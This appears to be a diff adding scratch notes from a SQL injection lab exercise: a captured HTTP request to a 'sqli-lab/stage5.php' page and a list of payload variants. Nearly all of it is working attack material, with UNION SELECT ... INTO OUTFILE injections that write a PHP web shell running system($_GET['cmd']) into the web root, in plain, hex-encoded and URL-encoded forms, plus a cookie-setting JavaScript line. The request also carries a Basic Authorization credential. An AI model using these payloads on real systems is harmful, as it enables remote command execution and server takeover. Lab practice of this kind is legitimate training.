@@ -1,0 +1,34 @@
+GET /sqli-lab/stage5.php?title='+UNION+SELECT+'<?php+echo+"<pre>";+system($_GET["cmd"]);+echo+"</pre>";?>'+INTO+OUTFILE+/var/www/html/out/out.php HTTP/1.1
+Host: wth-ffd84f49.dthdhcepfxhafpc7.japaneast.azurecontainer.io
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Authorization: Basic d2ViYXBwc2VjOjU4YWIzMzFmNmUyN2UyODZiZWIwYzZiOTc4YTA0ZjM4
+Referer: https://wth-ffd84f49.dthdhcepfxhafpc7.japaneast.azurecontainer.io/sqli-lab/stage5.php?title=Art+of+Exploitation
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+Connection: keep-alive
+
+
+'+UNION+SELECT+NULL,NULL,NULL,'<?php+echo+"<pre>";+system($_GET["cmd"]);+echo+"</pre>";?>'+INTO+OUTFILE+'/var/www/html/out/sample.php
+'+UNION+SELECT+NULL,NULL,NULL,0x3c3f706870206563686f20223c7072653e223b2073797374656d28245f4745545b22636d64225d293b206563686f20223c2f7072653e223b3f3e+INTO+OUTFILE+'/var/www/html/out/sample139.php
+'+UNION+SELECT+NULL,NULL,NULL,NULL,NULL,'HACKED
+
+'+UNION+SELECT+
+0x3c3f706870206563686f20223c7072653e223b2073797374656d28245f4745545b22636d64225d293b206563686f20223c2f7072653e223b203f3e
+
+%3C%3Fphp+echo+%27%3Cpre%3E%27%3B+system%28%24_GET%5B%27cmd%27%5D%29%3B+echo+%27%3C%2Fpre%3E%27%3B%3F%3E
+%3C%3Fphp%20echo%20%27%3Cpre%3E%27%3B%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20echo%20%27%3C%2Fpre%3E%27%3B%3F%3E
+
+3c3f706870206563686f20223c7072653e223b2073797374656d28245f4745545b22636d64225d293b206563686f20223c2f7072653e223b203f3e
+
+'+UNION+SELECT+3c3f706870206563686f20223c7072653e223b2073797374656d28245f4745545b22636d64225d293b206563686f20223c2f7072653e223b203f3e,NULL,NULL,NULL+INTO+OUTFILE+'%2Fvar%2Fwww%2Fhtml%2Fout%2Fout.php
+'<?php echo '<pre>'; system($_GET['cmd']); echo '</pre>';?>'
+document.cookie = 'session=ABC123; path=/'
+location.reload()
